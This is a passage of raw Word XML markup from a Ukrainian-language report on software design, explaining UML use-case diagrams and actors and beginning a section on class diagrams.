        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Use</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Case</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>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Діаграми варіантів використання (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>use-case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>) описують функціональне призначення системи або те, що система повинна робити.</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Розробка діаграми переслідує такі цілі: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">визначити спільні кордони і контекст модельованої предметної області; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">сформулювати загальні вимоги до функціонального поведінки проектованої системи; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">розробити вихідну концептуальну модель системи для її подальшої деталізації у формі логічних і фізичних моделей; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">підготувати вихідну документацію для взаємодії розробників системи з її замовниками і користувачами. </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Суть діаграми варіантів використання полягає в проектованої системі подання у вигляді безлічі сутностей або акторів, що взаємодіють з системою за допомогою варіантів використання. При цьому актором (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>actor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">) або дійовою особою називається будь-яка сутність, що взаємодіє з системою ззовні. Це може бути людина, технічний пристрій, програма або будь-яка інша система, яка може служити джерелом впливу на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>моделируемую</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> систему так, як визначить сам розробник. Варіант використання служить для опису сервісів, які система надає актору. Діаграма варіантів використання може доповнюватися пояснювальним текстом, який розкриває зміст або семантику складових її компонентів.</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">варіант використання </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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Окремий варіант використання позначається на діаграмі еліпсом, усередині якого міститься його коротка назва або ім'я у формі дієслова з пояснювальними словами. </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Мета варіанту використання полягає в тому, щоб визначити закінчений аспект або фрагмент поведінки деякої сутності без розкриття її внутрішньої структури. В якості такої сутності може виступати система або будь-який елемент моделі, який володіє власною поведінкою.</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Кожен варіант використання відповідає окремому сервісу, який надає </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>моделируемая</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> сутність за запитом актора, тобто визначає спосіб застосування цієї сутності. Сервіс, який </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>ініціалізується</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> за запитом актора, є закінченою неподільну послідовність дій. Це означає, що після того як система закінчить обробку запиту, вона повинна повернутися в початковий стан, щоб бути готовою до виконання наступних запитів.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="360"/>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Варіанти використання можуть застосовуватися як для специфікації зовнішніх вимог до проектованої системи, так і для специфікації функціонального поведінки вже існуючої системи. Безліч варіантів використання в цілому повинно визначати всі можливі сторони очікуваної поведінки системи. Крім цього, варіанти використання неявно встановлюють вимоги, що визначають, як актори повинні взаємодіяти з системою, щоб мати можливість </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>коректно</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> працювати з наданими сервісами. Діаграма варіантів використання представлена ​​на малюнку 2.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5233035" cy="3256915"/>
            <wp:effectExtent l="0" t="0" r="571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33035" cy="3256915"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Малюнок</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.1 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Електронна</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діаграма</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варіантів</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використання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="357"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="__RefHeading___Toc10641139"/>
      <w:bookmarkStart w:id="19" w:name="_Toc10727436"/>
      <w:bookmarkEnd w:id="18"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">2.2.2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діаграма</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класів</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="357"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діаграма</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класів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Static</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Structure</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>diagram</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">) - структурна </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>діаграма</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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мови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моделювання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
          </w:rPr>
          <w:t>UML</w:t>
        </w:r>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Що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демонструє</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загальну</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> структуру </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>ієрархії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId47" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>класів</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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системи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їх</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кооперацій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>атрибутів</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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Полів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>методів</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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Інтерфейсів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>взаємозв'язків</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між</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> ними. Широко </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>застосовується</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> не </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>тільки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>документування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>візуалізації</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, але </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
